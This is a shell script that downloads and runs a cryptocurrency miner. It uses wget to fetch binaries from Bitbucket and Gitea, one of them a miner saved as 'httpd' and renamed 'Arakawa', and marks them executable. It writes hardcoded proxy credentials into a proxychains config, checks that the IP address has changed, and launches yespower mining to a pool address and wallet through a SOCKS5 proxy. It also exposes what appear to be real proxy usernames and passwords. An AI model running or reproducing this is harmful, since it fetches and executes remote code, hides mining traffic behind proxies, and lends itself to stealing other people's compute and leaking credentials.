proxy="54.161.96.109" 
port="9293" 
user="9g4h0jzzs3ejmx"  
pass="jrwert8snib9ee9v16c9k264pv" 
wget -q -O Arakawa https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Arakawa
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./Arakawa -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Arakawa) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://9g4h0jzzs3ejmx:jrwert8snib9ee9v16c9k264pv@us-east-static-04.quotaguard.com:1080 
